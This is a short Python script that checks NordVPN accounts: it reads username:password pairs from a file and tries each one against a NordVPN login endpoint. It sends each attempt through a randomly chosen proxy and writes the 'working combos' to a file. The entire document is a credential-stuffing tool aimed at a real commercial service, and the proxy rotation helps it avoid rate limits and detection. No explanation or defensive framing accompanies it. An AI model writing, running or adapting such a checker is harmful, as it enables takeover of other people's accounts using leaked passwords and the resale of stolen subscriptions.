import requests
import time
from random import choice

# Load proxies from file
proxy_file = 'proxies.txt'
proxies = []
with open(proxy_file, 'r') as f:
    for line in f:
        proxy = line.strip()
        proxies.append({'http': f'http://{proxy}', 'https': f'http://{proxy}'})

# Load accounts from file
account_file = 'accounts.txt'
accounts = []
with open(account_file, 'r') as f:
    for line in f:
        username, password = line.strip().split(':')
        accounts.append((username, password))

# Function to check NordVPN account
def check_account(username, password, proxy):
    url = 'https://nordvpn.com/wp-admin/admin-ajax.php'
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'
    }
    data = {
        'action': 'login',
        'username': username,
        'password': password
    }
    try:
        response = requests.post(url, headers=headers, data=data, proxies=proxy, timeout=10)
        if response.status_code == 200:
            return True
        else:
            return False
    except requests.exceptions.RequestException as e:
        print(f'Error: {e}')
        return False

# Main loop
working_combos = []
for username, password in accounts:
    proxy = choice(proxies)
    print(f'Trying {username}:{password} with proxy {proxy["http"]}')
    if check_account(username, password, proxy):
        print(f'Working combo: {username}:{password}')
        working_combos.append((username, password))
    time.sleep(1)  # Avoid overwhelming the server

# Save working combos to file
with open('working_combos.txt', 'w') as f:
    for combo in working_combos:
        f.write(f'{combo[0]}:{combo[1]}\n')
